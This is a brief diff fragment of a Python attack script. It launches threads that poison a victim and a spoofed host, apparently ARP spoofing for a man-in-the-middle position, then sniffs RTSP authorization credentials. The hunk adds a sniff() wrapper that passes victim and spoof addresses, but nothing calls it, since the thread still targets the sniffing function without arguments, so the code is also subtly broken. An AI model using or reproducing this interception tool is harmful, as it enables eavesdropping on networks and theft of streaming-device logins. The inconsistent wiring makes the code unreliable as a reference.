@@ -105,6 +105,9 @@ if __name__ == "__main__":
     Thread(target=poison_victim).start()
     Thread(target=poison_spoof).start()
 
+    def sniff():
+        sniff_rtsp_authorization(victim_ip, spoof_ip)
+
     sniff_thread = Thread(target=sniff_rtsp_authorization)
     sniff_thread.start()
     sniff_thread.join()
